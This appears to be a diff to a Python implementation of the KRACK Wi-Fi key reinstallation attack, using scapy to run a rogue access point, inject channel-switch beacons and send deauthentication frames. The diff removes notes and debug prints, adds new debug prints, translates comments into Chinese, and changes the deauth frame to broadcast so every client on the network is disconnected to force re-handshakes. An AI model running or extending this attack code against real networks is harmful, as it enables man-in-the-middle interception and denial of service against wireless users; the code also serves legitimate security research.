@@ -14,18 +14,6 @@ import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, selec
 from datetime import datetime
 from wpaspy import Ctrl
 
-# Notes:
-# - This was tested using scapy 
-# - Dependencies: python-scapy (tested using 2.3.3), libnl-3-dev, libnl-genl-3-dev, pkg-config, libssl-dev, net-tools, macchanger
-#   * cp defconfig .config
-#
-# Research:
-# - Investigate how to make Atheros ACK all frames, while still allowing frame injection
-# - Reuse hostapd/kernel functionality to handle sleeping stations
-#
-# Optional future features:
-# - Option to attack specific client (search network its on, clone that one, and start attack)
-#
 # TODO:
 # - Mention to disable hardware encryption (similar to other attack test tools)
 # - Test against enterprise authentication. We will also have to forward EAP frames!
@@ -94,12 +82,10 @@ class MitmSocket(L2Socket):
 			rawframe = str(p[RadioTap])
 			pos = 8
 			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
-		
 			# If the TSFT field is present, it must be 8-bytes aligned
 			if p[RadioTap].present & 1 != 0:
 				pos += (8 - (pos % 8))
 				pos += 8
-
 			# Remove FCS if present
 			if ord(rawframe[pos]) & 0x10 != 0:
 				return Dot11(str(p[Dot11])[:-4])
@@ -107,15 +93,11 @@ class MitmSocket(L2Socket):
 
 	def recv(self, x=MTU):
 		p = L2Socket.recv(self, x)
-
 		if p == None: 
-			print('p is none')
 			return None
 		if p.getlayer(Dot11) == None:
-			print('no Dot11 in p')
 			return None
 		# if self.pcap: self.pcap.write(p)
-		
 		# Don't care about control frames
 		if p.type == 1:
 			log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
@@ -487,12 +469,10 @@ class KRAckAttack():
 		self.clients = dict()
 		self.disas_queue = []
 		self.continuous_csa = cont_csa
-
-		# To monitor wether interfaces are (still) on the proper channels
+		# 用來監控介面是否在適當的頻道中
 		self.last_real_beacon = None
 		self.last_rogue_beacon = None
-
-		# To attack/test the group key handshake
+		# 用來攻擊/測試 group key handshake
 		self.group1 = []
 		self.time_forward_group1 = None
 
@@ -711,6 +691,7 @@ class KRAckAttack():
 
 		# 2. Handle frames sent BY the real AP
 		elif p.addr2 == self.apmac:
+			print('694: has addr. is apmac')
 			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
 				self.last_real_beacon = time.time()
@@ -763,6 +744,7 @@ class KRAckAttack():
 
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
+			print('747: has addr. is apmac')
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
@@ -940,8 +922,8 @@ class KRAckAttack():
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 
-		# Try to deauthenticated all clients
-		dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
+		# Try to deauthenticated all clients, to re handshake
+		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
 		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		self.sock_real.send(deauth)
 
